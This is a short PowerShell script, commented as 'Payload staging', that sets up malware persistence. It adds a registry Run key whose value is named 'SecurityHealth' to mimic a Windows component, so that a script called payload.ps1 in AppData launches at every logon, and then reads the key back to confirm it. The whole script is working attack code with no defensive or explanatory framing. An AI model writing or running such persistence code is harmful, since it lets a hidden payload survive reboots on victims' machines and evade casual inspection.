
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\payload.ps1",
    [string]$RegistryValue = 'SecurityHealth'
)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue
Set-Location -Path $env:TEMP
